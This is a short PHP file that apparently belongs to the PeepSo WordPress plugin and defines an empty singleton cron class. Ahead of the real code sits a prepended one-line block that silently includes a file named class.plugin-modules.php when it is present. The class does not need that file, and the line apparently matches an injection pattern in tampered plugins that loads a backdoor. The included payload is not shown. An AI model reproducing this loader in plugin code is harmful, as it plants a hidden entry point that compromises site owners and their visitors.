<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class PeepSoMessagesCron
{
	private static $_instance = NULL;

	/**
	 * Class constructor
	 */
	private function __construct()
	{

	}

	/**
	 * Retrieve singleton class instance
	 * @return PeepSoMessagesCron instance
	 */
	public static function get_instance()
	{
		if (NULL === self::$_instance)
			self::$_instance = new self();
		return (self::$_instance);
	}
}

// EOF
